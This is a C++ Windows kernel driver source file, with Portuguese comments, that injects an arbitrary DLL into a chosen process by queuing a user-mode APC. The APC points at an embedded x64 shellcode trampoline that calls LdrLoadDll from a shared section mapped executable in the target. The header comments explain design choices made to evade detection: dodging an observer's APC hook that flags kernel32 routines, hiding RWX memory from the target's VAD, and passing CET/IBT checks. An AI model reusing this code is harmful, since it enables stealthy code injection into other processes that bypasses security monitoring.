// inject.cpp
// Injecao de DLL via APC do kernel — implementacao.
//
// Fluxo (Fase B1: trampolim shellcode + LdrLoadDll):
//   1. PsLookupProcessByProcessId / PsLookupThreadByThreadId       (refs +1)
//   2. Validar que a thread pertence ao processo alvo              (PsGetThreadProcess)
//   3. ZwCreateSection (SEC_COMMIT, PAGE_EXECUTE_READWRITE max, pagefile-backed)
//   4. ZwMapViewOfSection local (System VA) PAGE_READWRITE          (localView)
//   5. KeStackAttachProcess + ZwMapViewOfSection remoto PAGE_EXECUTE_READ (remoteView)
//   6. Escreve payload via localView (mesmas paginas fisicas):
//        - shellcode trampolim @ offset 0
//        - ldrLoadDllAddr        @ offset 0x80
//        - UNICODE_STRING        @ offset 0x90 (Buffer = remoteView + 0xA0)
//        - path wide + NUL       @ offset 0xA0
//   7. ZwUnmapViewOfSection local + ZwClose do handle da section — view remota
//      mantem section object viva via ControlArea.
//   8. ExAllocatePool2 (NonPaged) da KAPC                          (obrigatorio p/ APC)
//   9. KeInitializeApc: NormalRoutine = remoteView (entry do trampolim),
//                      NormalContext = remoteView (RCX pro shellcode)
//  10. KeInsertQueueApc                                            (enfileira)
//  11. ObDereferenceObject nas refs                                (refs -1)
//
// Por que trampolim shellcode em vez de NormalRoutine=kernel32!LoadLibraryW:
//   - APC dispatcher hook do observador que classifica NormalRoutine por modulo
//     ("kernel32 = suspeito") nao dispara — routine agora aponta pra dentro da
//     nossa section (nao mapeada como imagem, sem match de modulo).
//   - LdrLoadDll e o primitivo interno do proprio loader — chamado o tempo todo.
//   - Zero paginas RWX na view: local e RW (kernel escreve), remota e RX
//     (alvo executa). So a max prot da section e RWX, e essa nao aparece em VAD.
//   - endbr64 no inicio do shellcode: se o alvo tem CET/IBT ativo, a APC
//     dispatcher chama nossa NormalRoutine via indirect call — sem landing pad
//     valida da #CP(ENDBRANCH). Em CPU sem IBT, endbr64 e NOP.
//
// Se algo falhar, cada saida limpa exatamente o que ela alocou/referenciou.
//
// Nota de headers: usamos <ntifs.h> em vez de <ntddk.h> — ntifs.h e o header
// "file-system + private" que expoe KAPC_STATE, KeStackAttachProcess/Unstack e
// Zw*Section, que nao ficam visiveis via ntddk.h puro.
#include <ntifs.h>
#include "inject.h"

#define AFFCTL_APC_TAG 'IApc'

// KeInitializeApc/KeInsertQueueApc historicamente eram DDIs "privadas" e ainda
// nao estao declaradas em todos os headers publicos do WDK — declaramos aqui.
// PsLookupProcess*, KeStackAttachProcess e Zw*Section ja vem do ntifs.h.
extern "C" {

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2);

typedef VOID (NTAPI *PKKERNEL_ROUTINE)(
    struct _KAPC *Apc,
    PKNORMAL_ROUTINE *NormalRoutine,
    PVOID *NormalContext,
    PVOID *SystemArgument1,
    PVOID *SystemArgument2);

typedef VOID (NTAPI *PKRUNDOWN_ROUTINE)(struct _KAPC *Apc);

typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTKERNELAPI VOID NTAPI KeInitializeApc(
    PRKAPC Apc,
    PRKTHREAD Thread,
    KAPC_ENVIRONMENT Environment,
    PKKERNEL_ROUTINE KernelRoutine,
    PKRUNDOWN_ROUTINE RundownRoutine,
    PKNORMAL_ROUTINE NormalRoutine,
    KPROCESSOR_MODE ApcMode,
    PVOID NormalContext);

NTKERNELAPI BOOLEAN NTAPI KeInsertQueueApc(
    PRKAPC Apc,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    KPRIORITY Increment);

} // extern "C"

namespace {

// ---------------------------------------------------------------------------
// Layout da view (uma page ou mais, dependendo do path):
//   +0x00  shellcode trampolim x64 (~42 B)
//   +0x80  ldrLoadDllAddr           (QWORD, patched)
//   +0x90  UNICODE_STRING           (16 B: Length, MaxLength, pad, Buffer)
//   +0xA0  path wide + NUL          (dllPathBytes + sizeof(WCHAR))
// ---------------------------------------------------------------------------
constexpr SIZE_T kTrampolineOffset     = 0x00;
constexpr SIZE_T kLdrLoadDllOffset     = 0x80;
constexpr SIZE_T kUnicodeStringOffset  = 0x90;
constexpr SIZE_T kPathOffset           = 0xA0;

// Trampolim x64. Convencao Windows: RCX = NormalContext = view base (rbx apos
// mov). Chama LdrLoadDll(SearchPath=NULL, DllChars=NULL, &UNICODE_STRING, &out).
//   endbr64                          ; IBT landing pad (NOP em CPU sem CET)
//   push rbx                          ; RSP: 8-mod-16 -> 0-mod-16
//   sub  rsp, 30h                     ; 0x20 shadow + 8 local BaseAddress + 8 pad
//   mov  rbx, rcx                     ; rbx = view base (sobrevive a call)
//   xor  rcx, rcx                     ; SearchPath = NULL
//   xor  rdx, rdx                     ; DllCharacteristics = NULL
//   lea  r8,  [rbx + 0x90]            ; &UNICODE_STRING
//   lea  r9,  [rsp + 0x20]            ; &out_BaseAddress (stack local)
//   call qword ptr [rbx + 0x80]       ; call LdrLoadDll
//   add  rsp, 30h
//   pop  rbx
//   ret
constexpr UCHAR kTrampolineX64[] = {
    0xF3, 0x0F, 0x1E, 0xFA,                            // endbr64
    0x53,                                              // push rbx
    0x48, 0x83, 0xEC, 0x30,                            // sub rsp, 30h
    0x48, 0x89, 0xCB,                                  // mov rbx, rcx
    0x48, 0x31, 0xC9,                                  // xor rcx, rcx
    0x48, 0x31, 0xD2,                                  // xor rdx, rdx
    0x4C, 0x8D, 0x83, 0x90, 0x00, 0x00, 0x00,          // lea r8, [rbx+90h]
    0x4C, 0x8D, 0x4C, 0x24, 0x20,                      // lea r9, [rsp+20h]
    0xFF, 0x93, 0x80, 0x00, 0x00, 0x00,                // call qword ptr [rbx+80h]
    0x48, 0x83, 0xC4, 0x30,                            // add rsp, 30h
    0x5B,                                              // pop rbx
    0xC3                                               // ret
};
static_assert(sizeof(kTrampolineX64) <= kLdrLoadDllOffset,
              "Trampolim nao cabe antes de kLdrLoadDllOffset — reveja o layout");

// Estende KAPC com metadados de ownership. `apc` precisa ser o PRIMEIRO membro
// — o kernel opera sobre o ponteiro dele (PKAPC), e recuperamos o AffctlApc
// via CONTAINING_RECORD dentro das rotinas.
//
// ownerProc / ownedView:
//   - Se non-null, esta APC e dona da `ownedView` (view mapeada de uma section
//     anonima no VA space de `ownerProc`). Na rundown routine, fazemos attach
//     ao processo e ZwUnmapViewOfSection para nao deixar a VA do alvo com uma
//     view orfa caso a thread morra antes da APC disparar. O section object
//     em si vive enquanto houver view mapeada — desmapear a ultima libera tudo.
//   - Se null, a view e compartilhada com outras APCs (path watched — mesma
//     view serve varias threads do mesmo processo). Nao desmapeamos aqui;
//     a view some naturalmente com o VA do processo alvo (e o section object
//     junto, quando a ultima view sai).
struct AffctlApc {
    KAPC      apc;
    PEPROCESS ownerProc;
    PVOID     ownedView;
};

// Rotina kernel-mode: chamada ANTES da rotina normal (o trampolim), no
// contexto do processo alvo. A APC vai disparar normalmente — o shellcode le
// UNICODE_STRING + path da propria view em seguida — entao NAO desmapeamos
// ownedView aqui (ela fica na VA do processo alvo ate a morte natural, e o
// section object junto). Alem disso, esta rotina roda em APC_LEVEL, onde
// ZwUnmapViewOfSection nao e legal (exige PASSIVE_LEVEL) — outro motivo pra
// deixar a limpeza pro rundown.
VOID InjectApcKernelRoutine(
    PKAPC Apc,
    PKNORMAL_ROUTINE* /*NormalRoutine*/,
    PVOID* /*NormalContext*/,
    PVOID* /*SystemArgument1*/,
    PVOID* /*SystemArgument2*/)
{
    if (Apc == nullptr) return;
    auto* aa = CONTAINING_RECORD(Apc, AffctlApc, apc);
    if (aa->ownerProc) {
        ObDereferenceObject(aa->ownerProc);
    }
    ExFreePoolWithTag(aa, AFFCTL_APC_TAG);
}

// Rotina de rundown: chamada se a thread alvo morrer antes da APC disparar.
// O trampolim nao rodou — se somos donos da view, tentamos desmapear dentro
// da VA do processo alvo antes de largar a referencia. Se o processo alvo
// tambem estiver terminando (comum quando a thread do EntryPoint morre com
// o processo), attach/unmap podem falhar — o __try/__except cobre esse caso
// e a view some com a VA do processo de qualquer forma. O section object
// e liberado pelo Mm quando esta ultima view desaparece (por unmap ou por
// teardown de VAD no exit do processo).
VOID InjectApcRundownRoutine(PKAPC Apc)
{
    if (Apc == nullptr) return;
    auto* aa = CONTAINING_RECORD(Apc, AffctlApc, apc);
    if (aa->ownerProc && aa->ownedView) {
        __try {
            KAPC_STATE apcState;
            KeStackAttachProcess(aa->ownerProc, &apcState);
            ZwUnmapViewOfSection(ZwCurrentProcess(), aa->ownedView);
            KeUnstackDetachProcess(&apcState);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Processo alvo provavelmente esta terminando — VAD sera descartada.
        }
    }
    if (aa->ownerProc) {
        ObDereferenceObject(aa->ownerProc);
    }
    ExFreePoolWithTag(aa, AFFCTL_APC_TAG);
}

} // namespace

namespace affctl {

NTSTATUS AllocRemotePathBuffer(
    PEPROCESS process, PCWSTR dllPath, SIZE_T dllPathBytes,
    PVOID ldrLoadDllAddr, PVOID* outRemoteBase)
{
    if (!process || !dllPath || dllPathBytes == 0 ||
        !ldrLoadDllAddr || !outRemoteBase) {
        return STATUS_INVALID_PARAMETER;
    }
    *outRemoteBase = nullptr;

    // UNICODE_STRING guarda Length/MaximumLength em USHORT (16 bits) — path
    // fisicamente nao pode passar de 64KB. InjectDll ja rejeita > 32KB, mas
    // defesa em profundidade aqui evita truncar silenciosamente.
    if (dllPathBytes + sizeof(WCHAR) > 0xFFFEu) {
        return STATUS_INVALID_PARAMETER;
    }

    // Tamanho da section = layout fixo (trampolim + fn ptr + UNICODE_STRING) +
    // path + NUL. Mm arredonda pra PAGE_SIZE — sem custo real pra layouts pequenos.
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = (LONGLONG)(kPathOffset + dllPathBytes + sizeof(WCHAR));

    // OBJ_KERNEL_HANDLE: handle vive no handle table do System, indiferente ao
    // processo corrente e imune a fechamento acidental por user-mode.
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, OBJ_KERNEL_HANDLE, nullptr, nullptr);

    // Section max prot = RWX permite view local RW (kernel escreve) e view
    // remota RX (alvo executa) da mesma section. Section-level prot nao aparece
    // em VAD do alvo — so as VIEWS aparecem, e nenhuma delas e RWX.
    HANDLE hSec = nullptr;
    NTSTATUS status = ZwCreateSection(
        &hSec,
        SECTION_ALL_ACCESS,
        &oa,
        &maxSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        /*FileHandle*/ nullptr);
    if (!NT_SUCCESS(status)) return status;

    // 1) Mapeia LOCAL RW (System VA) pra escrever o payload depois.
    PVOID  localView = nullptr;
    SIZE_T localSize = 0;
    status = ZwMapViewOfSection(
        hSec, ZwCurrentProcess(),
        &localView, 0, 0,
        /*SectionOffset*/ nullptr, &localSize,
        ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        ZwClose(hSec);
        return status;
    }

    // 2) Mapeia REMOTO RX no alvo. Precisa vir antes da escrita porque o
    //    UNICODE_STRING.Buffer tem que apontar pra `remoteView + kPathOffset`
    //    — so sabemos esse endereco depois desta chamada.
    KAPC_STATE apcState;
    KeStackAttachProcess(process, &apcState);

    PVOID  remoteView = nullptr;
    SIZE_T remoteSize = 0;
    status = ZwMapViewOfSection(
        hSec, ZwCurrentProcess(),
        &remoteView, 0, 0,
        /*SectionOffset*/ nullptr, &remoteSize,
        ViewUnmap, 0, PAGE_EXECUTE_READ);
    KeUnstackDetachProcess(&apcState);

    if (!NT_SUCCESS(status)) {
        ZwUnmapViewOfSection(ZwCurrentProcess(), localView);
        ZwClose(hSec);
        return status;
    }

    // 3) Escreve payload via localView. As paginas fisicas sao compartilhadas
    //    com remoteView, entao a escrita ja fica visivel no VA do alvo assim
    //    que a APC dispara.
    __try {
        auto* base = (PUCHAR)localView;

        // 3a) Shellcode trampolim @ 0.
        RtlCopyMemory(base + kTrampolineOffset,
                      kTrampolineX64, sizeof(kTrampolineX64));

        // 3b) Ponteiro LdrLoadDll @ 0x80 (o `call qword ptr [rbx+80h]` do stub).
        *(PVOID*)(base + kLdrLoadDllOffset) = ldrLoadDllAddr;

        // 3c) UNICODE_STRING @ 0x90 com Buffer no VA do alvo.
        auto* us = (UNICODE_STRING*)(base + kUnicodeStringOffset);
        us->Length        = (USHORT)dllPathBytes;
        us->MaximumLength = (USHORT)(dllPathBytes + sizeof(WCHAR));
        us->Buffer        = (PWSTR)((PUCHAR)remoteView + kPathOffset);

        // 3d) Path wide + NUL @ 0xA0.
        auto* pathDst = (PWCHAR)(base + kPathOffset);
        RtlCopyMemory(pathDst, dllPath, dllPathBytes);
        pathDst[dllPathBytes / sizeof(WCHAR)] = L'\0';
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // Escrita local nao deveria falhar (paginas commited + RW no proprio
        // System VA), mas se o pool estiver corrompido / dllPath vier de user
        // sem probe, o SEH cobre. Desmapeia dos dois lados e devolve o objeto.
        KAPC_STATE st;
        KeStackAttachProcess(process, &st);
        ZwUnmapViewOfSection(ZwCurrentProcess(), remoteView);
        KeUnstackDetachProcess(&st);
        ZwUnmapViewOfSection(ZwCurrentProcess(), localView);
        ZwClose(hSec);
        return STATUS_ACCESS_VIOLATION;
    }

    // 4) Unmap local + close handle. remoteView segura o section object vivo
    //    via referencia interna da ControlArea.
    ZwUnmapViewOfSection(ZwCurrentProcess(), localView);
    ZwClose(hSec);

    *outRemoteBase = remoteView;
    return STATUS_SUCCESS;
}

NTSTATUS QueueLoadLibraryApc(
    PETHREAD  thread,
    PVOID     remoteBase,
    PEPROCESS ownerProcess)
{
    if (!thread || !remoteBase) {
        return STATUS_INVALID_PARAMETER;
    }
    auto* aa = (AffctlApc*)ExAllocatePool2(
        POOL_FLAG_NON_PAGED, sizeof(AffctlApc), AFFCTL_APC_TAG);
    if (!aa) return STATUS_INSUFFICIENT_RESOURCES;

    // Ownership da view: se caller passou ownerProcess, referenciamos aqui
    // pra manter EPROCESS vivo caso a rundown precise fazer attach depois.
    // A referencia e devolvida em InjectApcKernelRoutine ou InjectApcRundownRoutine.
    if (ownerProcess) {
        ObReferenceObject(ownerProcess);
        aa->ownerProc = ownerProcess;
        aa->ownedView = remoteBase;
    } else {
        aa->ownerProc = nullptr;
        aa->ownedView = nullptr; // view compartilhada — nao desmapeia aqui
    }

    // NormalRoutine = NormalContext = remoteBase. O trampolim esta no offset 0
    // da view, e recebe o proprio base em RCX (NormalContext) — usa isso pra
    // navegar pelos offsets do layout ate LdrLoadDll e UNICODE_STRING.
    KeInitializeApc(
        &aa->apc,
        (PRKTHREAD)thread,
        OriginalApcEnvironment,
        InjectApcKernelRoutine,
        InjectApcRundownRoutine,
        (PKNORMAL_ROUTINE)remoteBase,
        UserMode,
        remoteBase);

    BOOLEAN inserted = KeInsertQueueApc(&aa->apc, nullptr, nullptr, IO_NO_INCREMENT);
    if (!inserted) {
        // Nenhuma rotina vai rodar — desfazemos ownership manualmente.
        if (aa->ownerProc) {
            ObDereferenceObject(aa->ownerProc);
        }
        ExFreePoolWithTag(aa, AFFCTL_APC_TAG);
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

NTSTATUS InjectDll(
    HANDLE pid,
    HANDLE tid,
    PVOID  ldrLoadDllAddr,
    PCWSTR dllPath,
    SIZE_T dllPathBytes)
{
    // Validacao basica dos parametros. Rejeita cedo — antes de qualquer alloc.
    if (ldrLoadDllAddr == nullptr || dllPath == nullptr ||
        dllPathBytes == 0 || dllPathBytes > 32u * 1024u) {
        return STATUS_INVALID_PARAMETER;
    }
    if ((dllPathBytes % sizeof(WCHAR)) != 0) {
        return STATUS_INVALID_PARAMETER;
    }

    PEPROCESS targetProc  = nullptr;
    PETHREAD  targetThread = nullptr;
    NTSTATUS  status;

    status = PsLookupProcessByProcessId(pid, &targetProc);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = PsLookupThreadByThreadId(tid, &targetThread);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(targetProc);
        return status;
    }

    // A thread precisa pertencer ao processo alvo — senao a APC injetaria
    // no processo errado (potencial crash de outro processo).
    if (PsGetThreadProcess(targetThread) != targetProc) {
        ObDereferenceObject(targetThread);
        ObDereferenceObject(targetProc);
        return STATUS_INVALID_PARAMETER;
    }

    // 1) Cria section com trampolim + path, mapeia view RX no alvo.
    PVOID remoteBase = nullptr;
    status = AllocRemotePathBuffer(
        targetProc, dllPath, dllPathBytes, ldrLoadDllAddr, &remoteBase);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(targetThread);
        ObDereferenceObject(targetProc);
        return status;
    }

    // 2) Enfileira APC user-mode apontando pro trampolim. Passamos targetProc
    //    como owner da view — a rundown routine desmapeia se a thread morrer
    //    antes da APC disparar (ela referencia targetProc internamente, alem
    //    da referencia local que soltamos abaixo).
    status = QueueLoadLibraryApc(targetThread, remoteBase, targetProc);
    // Se KeInsertQueueApc falhou dentro de QueueLoadLibraryApc, a APC nao vai
    // rodar — nem a rundown. A view remota vira leak minusculo (uma pagina)
    // na VA do processo alvo, que some quando ele morrer, junto com o section
    // object (ultima view). Aceitavel.

    ObDereferenceObject(targetThread);
    ObDereferenceObject(targetProc);
    return status;
}

} // namespace affctl
